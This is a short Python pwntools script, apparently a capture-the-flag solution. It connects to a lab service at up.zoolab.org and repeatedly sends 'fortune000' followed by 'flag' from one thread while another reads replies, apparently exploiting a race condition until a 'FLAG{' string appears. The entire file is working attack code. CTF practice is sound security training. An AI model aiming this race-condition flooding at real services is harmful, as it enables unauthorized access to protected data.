from pwn import *
import threading

def send_exploit():
    global isflag
    while not isflag:
        for _ in range(10):  
            conn.sendline("fortune000\nflag".encode())
        res_cnt = 0
        while res_cnt < 2:
            responseline = conn.recvline().decode().strip()
            print(responseline)
            if "FLAG{" in responseline:  
                isflag = True
                print("Flag found")
                return 
            res_cnt += 1

def receive_responses():
    global isflag
    res_cnt = 0
    while res_cnt < 3:
        responseline = conn.recvline().decode().strip()
        print(responseline)
        res_cnt += 1
    
    if isflag:
        return

conn = remote('up.zoolab.org', 10931)

isflag = False

send_thread = threading.Thread(target=send_exploit)
recv_thread = threading.Thread(target=receive_responses)

# Start both threads
send_thread.start()
recv_thread.start()

send_thread.join()
recv_thread.join()

conn.close()
